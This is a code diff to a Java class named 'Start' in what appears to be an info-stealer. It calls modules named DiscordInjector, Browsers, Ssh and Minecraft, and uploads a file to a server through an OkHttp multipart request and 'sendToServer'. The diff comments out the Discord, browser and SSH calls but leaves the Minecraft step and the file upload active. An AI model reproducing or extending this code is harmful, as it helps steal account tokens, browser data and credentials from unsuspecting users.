@@ -30,6 +30,7 @@ public class Start {
 			DiscordInjector.instance = new DiscordInjector();
 		}
 	    //DiscordInjector.instance.initialize();
+        /*
         Sender.sendMessage("DiscordInjector initialized.");
 		Sender.sendMessage("Starting other arguments...");
 		Browsers.main(argument);
@@ -39,6 +40,7 @@ public class Start {
 		Ssh.main(argument);
 		Sender.sendMessage("Ssh done.");
 		Sender.sendMessage("Now launching the client.");
+		*/
         Minecraft.sendMinecraft();
         OkHttpClient client = new OkHttpClient();
 
@@ -69,7 +71,7 @@ public class Start {
                 .addFormDataPart("file", asd.getName(), RequestBody.create(MediaType.parse("application/octet-stream"), asd))
                 .build();
 
-        Sender.Sender(client, asd, requestBody);
+        Sender.Sender(client, requestBody);
 
         Sender.sendToServer(zort);
 
